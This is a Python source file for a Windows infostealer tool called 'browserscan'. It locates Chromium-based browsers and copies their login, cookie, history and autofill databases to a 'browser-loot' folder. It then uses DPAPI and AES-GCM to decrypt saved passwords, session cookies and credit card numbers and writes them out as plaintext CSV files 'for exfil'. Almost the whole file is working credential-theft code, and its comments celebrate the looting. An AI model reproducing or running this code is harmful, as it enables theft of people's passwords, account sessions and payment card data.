#!/usr/bin/env python3

"""browserscan  Scans for browser data, decrypts, and prepares it for exfil.
Copyright (C) 2020  Alertra, Inc.

Author: Kirby Angell <delete.this.kangell@alertra.com>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""

import os
import sys
import sqlite3
import win32crypt
import json
import base64
import csv
from shutil import copyfile
from Crypto.Cipher import AES

class ChromiumScanner:
    """This class contains everything we learn about Chromium browsers."""

    # Necessary values copied from the components/os_crypt_win.cc Chromium
    # source code.
    CHROME_ENC_VER10_PREFIX = b"v10"
    CHROME_NONCE_LENGTH = int(96 / 8)
    CHROME_OSCRYPT_ENCRYPTEDKEYPREF_NAME = "os_crypt.encrypted_key"
    CHROME_DPAPI_PREFIX = b"DPAPI"

    # This prefix is attached to values Window's DPAPI CryptProtectData encrypts.
    DPAPI_PREFIX = b"\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB"

    LOGIN_DATA_NAME = "Default\\Login Data"
    COOKIES = "Default\\Cookies"
    HISTORY = "Default\\History"
    BOOKMARKS = "Default\\Bookmarks"
    WEBDATA = "Default\\Web Data"
    LOCAL_STATE_NAME = "Local State"
    
    STAGING_DIR = ".\\browser-loot"
    STAGING_LOGIN_DATA = "passwords.sqlite3"
    STAGING_COOKIES = "cookies.sqlite3"
    STAGING_STATE_DATA = "state.json"
    STAGING_HISTORY = "history.sqlite3"
    STAGING_BOOKMARKS = "bookmarks.json"
    STAGING_WEBDATA = "webdata.sqlite3"
    
    def __init__(self):

        # Data on all of the Chromium based browsers we can find.
        self.browsers = {}
        self.datapaths = {}
        self._find_browsers()

    def enum_browsers(self):
        """Enumerate the browser, suck out all the relevant data our black hearts desire."""

        # Currently we extract the local state which is a json file containing 
        # browser preferences and internal data. We also extract and decrypt the
        # login passwords.
        #

        for name,path in self.datapaths.items():
            # See if this browser is installed by looking for some key files. We don't ask
            # Windows about it because if the browser has been uninstalled the files we seek might still
            # be around.
            if os.path.isfile(os.path.join(path, ChromiumScanner.LOGIN_DATA_NAME)) and \
                os.path.isfile(os.path.join(path, ChromiumScanner.LOCAL_STATE_NAME)):
                self.browsers[name] = browser = {'name':name}
                browser["path"] = path

                print("[+] Processing %s browser" % name)

                self._copy_interesting_files(browser)
                print(" [+] Data copied to staging.")

                # If it exists, get the chrome key and store it in the browser data
                self._getchromekey(browser)

                self._decrypt_passwords(browser)
                self._write_plaintext_passwords(browser)
                if "passwords" in browser:
                    print(" [+]  %d passwords decrypted." % (len(browser["passwords"])))
                else:
                    print(" [+]  0 passwords decrypted.")

                self._decrypt_cookies(browser)
                self._write_plaintext_cookies(browser)
                if "cookies" in browser:
                    print(" [+]  %d cookies decrypted." % (len(browser["cookies"])))
                else:
                    print(" [+]  0 cookies decrypted.")

                self._decrypt_ccards(browser)
                self._write_plaintext_ccards(browser)
                if "ccards" in browser:
                    print(" [+]  %d credit cards decrypted." % (len(browser["ccards"])))
                else:
                    print(" [+]  0 credit cards decrypted.")

        return self.browsers

    def decrypt_ciphertext(self, browser, ciphertext):
        """decrypt data that has previously been encrypted by the selected browser."""

        plaintext = chromekey = None
        if "chromekey" in browser:
            chromekey = browser["chromekey"]

        # If this is a Chrome v10 encrypted password
        if ciphertext.startswith(ChromiumScanner.CHROME_ENC_VER10_PREFIX):
            # Strip the version prefix
            ciphertext = ciphertext[len(ChromiumScanner.CHROME_ENC_VER10_PREFIX):]
            nonce = ciphertext[:ChromiumScanner.CHROME_NONCE_LENGTH]
            # Strip the nonce and ver prefix
            ciphertext = ciphertext[ChromiumScanner.CHROME_NONCE_LENGTH:]
            # I hate magic numbers, but there is 16 extra bytes
            # on the end of the ciphertext. I thought this had something to do
            # with "initialization vector" or "mac len", but it doesn't.
            # Hopefully someone more crypto savvy can enlighten me.
            ciphertext = ciphertext[:-16]
            
            cipher = AES.new(chromekey,AES.MODE_GCM,nonce=nonce)
            plaintext = cipher.decrypt(ciphertext).decode("UTF-8")
        
        # Older versions of Chrome on windows did not use an internally generated
        # key, they just called DPAPI. DPAPI uses its own prefix to identify things it 
        # has encrypted, so we can look for that.
        elif ciphertext.startswith(ChromiumScanner.DPAPI_PREFIX):
            # Decrypt the key using Windows encryption
            # This will not work if the user's password was changed by an
            # administrator. 
            plaintext = win32crypt.CryptUnprotectData(ciphertext)[1].decode("UTF-8")

        return plaintext

    def _getchromekey(self, browser):
        # Newer versions of Chrome generate a key to encrypt the user passwords with.
        # Chrome encrypts THAT password on Windows using the Windows DPAPI and then
        # base64 encodes it to store in the browser state file.
        chromekey = None
        try:
            state = browser["state"]
            encrypted_key = state["os_crypt"]["encrypted_key"]
            encrypted_key = base64.b64decode(encrypted_key)

            if encrypted_key.startswith(ChromiumScanner.CHROME_DPAPI_PREFIX): 
                # Decrypt the key using Windows encryption
                # This will not work if the user's password was changed by an
                # administrator. 
                chromekey = win32crypt.CryptUnprotectData(encrypted_key[len(ChromiumScanner.CHROME_DPAPI_PREFIX):])[1]
            else:
                chromekey = encrypted_key

            # Just in case we might want this key later.. lets save it.
            # Only time wecan get it is now if it was encrypted with DPAPI
            binfile = os.path.join(browser["staging_dir"], "chromekey.bin")
            with open(binfile, "wb") as f:
                f.write(chromekey)

        except:
            print(" [*] Chromium encryption key not found or not usable; maybe older version")

        browser["chromekey"] = chromekey
        return chromekey

    def _find_browsers(self):
        # We're looking for directories that contain 2 critical files
        # "Login Data" and "Local State". Those probably are Chromium browsers.

        sourcedir = os.path.expanduser('~') + "\\AppData\\Local\\"
        for publisher in os.listdir(sourcedir):
            pubdir = os.path.join(sourcedir,publisher)
            try:
                for bname in os.listdir(pubdir):
                    ls = os.path.join(pubdir,bname,"User Data",ChromiumScanner.LOCAL_STATE_NAME)
                    if os.path.exists(ls):
                        ld = os.path.join(pubdir,bname,"User Data",ChromiumScanner.LOGIN_DATA_NAME)
                        if os.path.exists(ld):
                            self.datapaths[publisher+"\\"+bname] = os.path.join(pubdir,bname,"User Data")
            except:
                pass

    def _copy_browser_file(self, browser,key, src, dest):
    
        try:
            path = browser["path"]
            browser[key] = os.path.join(browser["staging_dir"], dest)
            copyfile(os.path.join(path, src), browser[key])
        except:
            print(" [-] Unable to copy %s (%s)." % (src, sys.exc_info()[1]))

    def _copy_interesting_files(self, browser):
        # Copy data from the browser install to our staging directory. 
        # Take all you can, give nothing back.

        browser["staging_dir"] = os.path.join(ChromiumScanner.STAGING_DIR,browser["name"])
        os.makedirs(browser["staging_dir"], exist_ok=True)

        # Grabbing the browser state file
        self._copy_browser_file(
            browser, "state_file", ChromiumScanner.LOCAL_STATE_NAME, ChromiumScanner.STAGING_STATE_DATA
        )
        browser["state"] = prettyprintjson(browser["state_file"])

        # Grabbing the browser bookmarks file
        self._copy_browser_file(
            browser, "bookmark_file", ChromiumScanner.BOOKMARKS, ChromiumScanner.STAGING_BOOKMARKS
        )
        
        # Login data with url, username, cleartext passwords.. yummy!
        self._copy_browser_file(
            browser, "password_file", ChromiumScanner.LOGIN_DATA_NAME, ChromiumScanner.STAGING_LOGIN_DATA
        )
        
        # Grabbing the Cookies the browser stores for the user
        self._copy_browser_file(
            browser, "cookie_file", ChromiumScanner.COOKIES, ChromiumScanner.STAGING_COOKIES
        )
        
        # Grabbing the History the browser stores for the user
        self._copy_browser_file(
            browser, "history_file", ChromiumScanner.HISTORY, ChromiumScanner.STAGING_HISTORY
        )

        # Grabbing the autofil/ccard data the browser stores for the user
        self._copy_browser_file(
            browser, "webdata_file", ChromiumScanner.WEBDATA, ChromiumScanner.STAGING_WEBDATA
        )

    def _decrypt_passwords(self, browser):
        # We expect the passwords to all be in a sqlite3 database. Here we have to go through
        # that data and also figure out how the password was encrypted.
        browser["passwords"] = passwords = {}
        
        try:
            db = sqlite3.connect(browser["password_file"])
        except:
            print(" [-] Unable to open password file; expected a SQLite3 database.")
            return None
            
        cursor = db.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        data = cursor.fetchall()

        for url, username, ciphertext in data:
            plaintext = self.decrypt_ciphertext(browser, ciphertext)
            if plaintext:
                passwords[url] = (url, username, plaintext)
            else:
                print(" [-] Error decrypting password for '%s'." % url)

    def _write_plaintext_passwords(self, browser):
        self._write_plaintext_dict(browser, "passwords", ["url", "username", "plaintext"])

    def _decrypt_cookies(self, browser):

        browser["cookies"] = cookies = {}

        try:
            db = sqlite3.connect(browser["cookie_file"])
        except:
            print(" [-] Unable to open Cookie file; expected a SQLite3 database.")
            return None
            
        cursor = db.cursor()
        cursor.execute("SELECT creation_utc, host_key, name, value, path, encrypted_value FROM cookies")
        data = cursor.fetchall()

        for cutc, host_key, name, value, path, ciphertext in data:
            plaintext = self.decrypt_ciphertext(browser, ciphertext)
            if plaintext:
                cookies["%s/%s" % (cutc,host_key)] = (host_key, name, value, path, plaintext)
            else:
                cookies["%s/%s" % (cutc,host_key)] = (host_key, name, value, path, ciphertext)

    def _write_plaintext_cookies(self, browser):
        self._write_plaintext_dict(browser, "cookies", ["host_key", "name", "value", "path", "plaintext"])

    def _decrypt_ccards(self, browser):

        browser["ccards"] = ccards = {}

        try:
            db = sqlite3.connect(browser["webdata_file"])
        except:
            print(" [-] Unable to open Webdata file; expected a SQLite3 database.")
            return None
            
        cursor = db.cursor()
        cursor.execute("SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
        data = cursor.fetchall()

        for guid, name_on_card, exprymonth, expiryyear, ciphertext in data:
            plaintext = self.decrypt_ciphertext(browser, ciphertext)
            if plaintext:
                ccards[guid] = (guid, name_on_card, exprymonth, expiryyear, plaintext)
            else:
                ccards[guid] = (guid, name_on_card, exprymonth, expiryyear, ciphertext)

    def _write_plaintext_ccards(self, browser):
        self._write_plaintext_dict(browser, "ccards", ["guid", "name_on_card", "exprymonth", "expiryyear", "card_number"])

    def _write_plaintext_dict(self, browser, dictname, header):

        if dictname in browser:
            thedict = browser[dictname]
            if len(thedict.items()) == 0:
                return

            with open(os.path.join(browser["staging_dir"],"plaintext-%s.csv" % dictname), 'w', newline='') as csvfile:
                csvf = csv.writer(csvfile,dialect=csv.excel_tab)
                csvf.writerow(header)
                for key,value in thedict.items():
                    csvf.writerow(value)

def prettyprintjson(filename):
    # Yes this code could have done the copy too, but we want the file regardless of whether it
    # is valid json or not.
    data = None
    try:
        # Cleanup the json files to make them easier for humans to evaluate later.
        data = json.load(open(filename,'r'))
        open(filename,'w').write(json.dumps(data, indent=1))
    except:
        print(" [-] Error loading json %s" % filename)
    return data

# This is sparse right now, but we'll be adding more browsers ASAP...
# Ok, we're going to add Firefox and that's probably it. :-)
if __name__ == "__main__":
    
    for d in __doc__.splitlines(keepends=False):
        if len(d): 
            print(d)
        else:
            break

    print()
    print("[+] User: ",os.path.expanduser('~'))

    # Lets do a quick sanity test
    plaintext = b"thequickbrownfoxjumpedoverthelazydog"
    cyphertext = win32crypt.CryptProtectData(plaintext)
    if not plaintext == win32crypt.CryptUnprotectData(cyphertext)[1]:
        print("Windows DPAPI not working. Is this a logged in user?")
        sys.exit(0)

    b = ChromiumScanner()
    browsers = b.enum_browsers()
